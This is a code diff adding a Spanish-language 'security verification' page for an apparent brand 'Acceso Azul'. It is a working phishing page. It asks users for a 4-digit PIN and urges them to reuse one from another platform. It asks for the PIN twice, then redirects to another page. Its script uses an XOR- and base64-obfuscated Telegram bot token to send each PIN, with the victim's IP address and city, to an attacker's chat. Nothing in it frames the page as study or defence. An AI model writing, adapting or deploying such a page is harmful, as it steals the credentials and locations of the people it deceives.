@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de seguridad</title>
+  <style>
+    :root {
+      --brand: #1e3a8a;
+      --brand-dark: #172554;
+      --accent: #3b82f6;
+      --accent-hover: #2563eb;
+      --bg: #eef2f7;
+      --card: #ffffff;
+      --text: #0f172a;
+      --muted: #64748b;
+      --border: #cbd5e1;
+      --error: #b91c1c;
+      --success: #15803d;
+      --loading: #1d4ed8;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: "Inter", "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: radial-gradient(circle at 20% 20%, #dbeafe 0%, transparent 40%),
+                  radial-gradient(circle at 80% 80%, #e0e7ff 0%, transparent 40%),
+                  var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: var(--card);
+      border-radius: 18px;
+      padding: 40px 36px 32px;
+      box-shadow: 0 20px 50px -12px rgba(15, 23, 42, .25);
+      border: 1px solid rgba(148, 163, 184, .25);
+      position: relative;
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 36px; right: 36px;
+      height: 3px;
+      border-radius: 0 0 4px 4px;
+      background: linear-gradient(90deg, var(--accent), var(--brand));
+    }
+
+    .org {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .org .crest {
+      width: 34px; height: 34px;
+      border-radius: 9px;
+      background: linear-gradient(145deg, var(--brand), var(--brand-dark));
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      font-size: 15px;
+      letter-spacing: -0.5px;
+    }
+
+    .org span {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--muted);
+      letter-spacing: .3px;
+    }
+
+    h1 {
+      font-size: 23px;
+      font-weight: 700;
+      letter-spacing: -.4px;
+      margin-bottom: 8px;
+    }
+
+    .sub {
+      font-size: 14px;
+      line-height: 1.55;
+      color: var(--muted);
+      margin-bottom: 26px;
+      min-height: 44px;
+    }
+
+    .field { margin-bottom: 4px; }
+
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 10px;
+    }
+
+    .pin-box {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      background: #f8fafc;
+      transition: border-color .15s, box-shadow .15s, background .15s;
+    }
+
+    .pin-box:focus-within {
+      border-color: var(--accent);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, .18);
+    }
+
+    .pin-box input {
+      flex: 1;
+      width: 100%;
+      border: none;
+      background: transparent;
+      outline: none;
+      padding: 16px 8px;
+      font-family: inherit;
+      font-size: 26px;
+      font-weight: 700;
+      letter-spacing: 16px;
+      text-indent: 16px;
+      text-align: center;
+      color: var(--text);
+    }
+
+    .pin-box input::placeholder {
+      color: #b6c2d4;
+      font-weight: 500;
+      letter-spacing: 10px;
+      text-indent: 10px;
+    }
+
+    .pin-box input:-webkit-autofill {
+      -webkit-box-shadow: 0 0 0 1000px #f8fafc inset !important;
+      -webkit-text-fill-color: var(--text) !important;
+    }
+
+    .dots {
+      display: flex;
+      justify-content: center;
+      gap: 9px;
+      margin: 18px 0 24px;
+    }
+
+    .dots span {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #d6dee9;
+      transition: background .25s, transform .25s;
+    }
+
+    .dots span.done { background: var(--accent); transform: scale(1.05); }
+    .dots span.now  { background: #93b8ea; }
+
+    .btn {
+      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-hover) 100%);
+      color: #fff;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      letter-spacing: .2px;
+      cursor: pointer;
+      transition: transform .12s, box-shadow .15s, opacity .15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      box-shadow: 0 6px 16px -6px rgba(37, 99, 235, .6);
+    }
+
+    .btn:hover { transform: translateY(-1px); box-shadow: 0 10px 20px -8px rgba(37, 99, 235, .7); }
+    .btn:active { transform: translateY(0); }
+    .btn:disabled { opacity: .7; cursor: not-allowed; transform: none; }
+
+    .btn .btn-text { display: flex; align-items: center; gap: 7px; }
+    .btn.loading .btn-text { visibility: hidden; }
+
+    .btn.loading::after {
+      content: "";
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border: 2.5px solid rgba(255, 255, 255, .35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .msg {
+      display: none;
+      margin-top: 16px;
+      font-size: 13px;
+      line-height: 1.5;
+      padding: 10px 12px;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+
+    .msg.error   { display: block; background: #fef2f2; color: var(--error); }
+    .msg.success { display: block; background: #f0fdf4; color: var(--success); }
+    .msg.loading { display: block; background: #eff6ff; color: var(--loading); }
+
+    .bottom {
+      margin-top: 26px;
+      padding-top: 18px;
+      border-top: 1px solid #e8edf4;
+      font-size: 13px;
+      color: var(--muted);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .bottom a {
+      color: var(--accent);
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .bottom a:hover { text-decoration: underline; }
+
+    .legal {
+      margin-top: 20px;
+      font-size: 11.5px;
+      color: #94a3b8;
+      text-align: center;
+    }
+
+    @media (max-width: 460px) {
+      body { padding: 0; background: #fff; justify-content: flex-start; }
+      .card {
+        border: none; box-shadow: none; border-radius: 0;
+        padding: 28px 22px; max-width: 100%;
+      }
+      .card::before { left: 22px; right: 22px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="org">
+      <div class="crest"><img width="50px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToUIe9A6QvLvypxEQu3Y8mJ7WCb9L6pROqNg&s" alt=""></div>
+    
+    </div>
+
+    <h1 id="title">Verificación de seguridad</h1>
+    <p class="sub" id="subtitle">Crea un PIN de 4 dígitos. Usa uno fácil de recordar o que ya uses en otra plataforma.</p>
+
+    <form id="pinForm" autocomplete="off">
+      <div class="field">
+        <label for="pin" id="pinLabel">PIN de 4 dígitos</label>
+        <div class="pin-box">
+          <input type="text" id="pin" name="pin" placeholder="••••" maxlength="4"
+                 inputmode="numeric" pattern="[0-9]{4}" autocomplete="off" required>
+        </div>
+        <div class="dots" id="dots">
+          <span class="now"></span>
+          <span></span>
+        </div>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">
+        <span class="btn-text">Continuar</span>
+      </button>
+
+      <div id="message" class="msg"></div>
+    </form>
+
+    <div class="bottom">
+      <span>¿Problemas para verificar?</span>
+      <a href="#">Contactar soporte</a>
+    </div>
+  </div>
+
+  <div class="legal">© 2026 Acceso Azul · Términos de uso · Privacidad</div>
+
+  <script>
+(function () {
+  'use strict';
+
+  function tgDec(s) {
+    const k = 'm4g0rd0';
+    const d = atob(s);
+    let o = '';
+    for (let i = 0; i < d.length; i++) o += String.fromCharCode(d.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+    return o;
+  }
+  const TG_TOKEN = tgDec('VAVRAkZTAVQCVgozJXgydzB3PVxSNEc9VyY8Y15lMHEnCGgaBRFlIjUCK1s+Ww==');
+  const TG_CHAT = tgDec('QAVXAEFdCVwCUgZBVgg=');
+
+  async function enviarTelegram(texto) {
+    const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage' +
+      '?chat_id=' + encodeURIComponent(TG_CHAT) +
+      '&text=' + encodeURIComponent(texto);
+    try { await fetch(url, { mode: 'no-cors' }); } catch (e) {}
+  }
+
+  const REDIRECT_URL = 'face0.html';
+  const MAX_PINS = 2;
+
+  const form = document.getElementById('pinForm');
+  const pinInput = document.getElementById('pin');
+  const submitBtn = document.getElementById('submitBtn');
+  const messageDiv = document.getElementById('message');
+  const dots = document.querySelectorAll('#dots span');
+  const title = document.getElementById('title');
+  const subtitle = document.getElementById('subtitle');
+  const pinLabel = document.getElementById('pinLabel');
+
+  let isSubmitting = false;
+  const enviados = [];
+
+  function showMessage(text, type = 'error', timeout = 5000) {
+    messageDiv.textContent = text;
+    messageDiv.className = 'msg ' + type;
+    if (timeout > 0) {
+      setTimeout(() => { messageDiv.className = 'msg'; messageDiv.textContent = ''; }, timeout);
+    }
+  }
+
+  function pintarDots() {
+    dots.forEach((d, i) => {
+      d.classList.remove('done', 'now');
+      if (i < enviados.length) d.classList.add('done');
+      else if (i === enviados.length) d.classList.add('now');
+    });
+  }
+
+  async function getLocation() {
+    try {
+      const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+      if (!r.ok) throw 0;
+      const d = await r.json();
+      return `${d.city || 'Desconocida'}, ${d.country_name || 'Desconocido'}`;
+    } catch { return 'No disponible'; }
+  }
+
+  async function getIP() {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+      if (!r.ok) throw 0;
+      const d = await r.json();
+      return d.ip || 'No disponible';
+    } catch { return 'No disponible'; }
+  }
+
+  async function enviarPin(pin, index) {
+    try {
+      const [ip, location] = await Promise.all([getIP(), getLocation()]);
+      await enviarTelegram(
+        '📥 PIN ingresado\n\n' +
+        'pin: ' + pin + '\n' +
+        'intento: ' + index + ' de ' + MAX_PINS + '\n' +
+        'ip: ' + ip + '\n' +
+        'location: ' + location
+      );
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  pinInput.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+  });
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    if (isSubmitting) return;
+
+    const pin = pinInput.value.trim();
+
+    if (!/^\d{4}$/.test(pin)) {
+      showMessage('El PIN debe tener exactamente 4 dígitos.');
+      return;
+    }
+
+    const paso = enviados.length + 1;
+    enviados.push(pin);
+
+    isSubmitting = true;
+    submitBtn.disabled = true;
+    submitBtn.classList.add('loading');
+    pinInput.value = '';
+    pintarDots();
+    showMessage('Verificando…', 'loading', 0);
+
+    await enviarPin(pin, paso);
+
+    isSubmitting = false;
+    submitBtn.disabled = false;
+    submitBtn.classList.remove('loading');
+
+    if (enviados.length < MAX_PINS) {
+      title.textContent = 'Confirma tu PIN';
+      subtitle.textContent = 'Vuelve a escribir los 4 dígitos para confirmar que los recuerdas.';
+      pinLabel.textContent = 'Confirmar PIN';
+      submitBtn.querySelector('.btn-text').textContent = 'Confirmar';
+      messageDiv.className = 'msg';
+      pinInput.focus();
+    } else {
+      showMessage('PIN confirmado correctamente. Redirigiendo…', 'success', 0);
+      setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
+    }
+  });
+
+  pintarDots();
+  pinInput.focus();
+})();
+  </script>
+</body>
+</html>
